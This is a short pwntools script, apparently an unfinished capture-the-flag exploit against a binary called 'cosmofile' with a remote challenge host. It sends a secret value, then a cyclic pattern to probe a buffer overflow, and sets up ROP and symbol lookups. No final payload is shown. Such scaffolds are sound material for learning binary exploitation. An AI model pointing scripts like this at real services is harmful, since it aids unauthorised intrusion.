from pwn import *

context.terminal =  ["tmux", "splitw", "-h"] 
context.endian = 'little'
BINARY = "./cosmofile"
HOST = "34.45.81.67"
PORT = 16005

elf = ELF(BINARY)

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

rop = ROP(elf)

MAIN = elf.symbols["main"]
PUTS = elf.symbols["cosmo_puts"]

# start process
p = start_binary()

if not args.REMOTE and args.GDB:
    gdb.attach(p, """
    b* 0x40C80F
    c
    """)
print(p.recvuntil(b"> ").decode())
p.sendline(b"7238770")
# aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaa
# print(p.recv())
print(p.recvuntil(b"Just kidding, that's not really a secret...\n").decode())

# p.recvuntil(b"Just kidding")
# print(p.recv())
# p.send(payload)
# p.recvuntil(b"> ")
p.sendline(cyclic(0x70))
# p.sendline(b"\n")
print(p.recv().decode())
p.sendline(b"1")
print(p.recv().decode())
# p.sendline(b"\n")
# print(p.recv().decode())
# print(p.recv())
# p.interactive()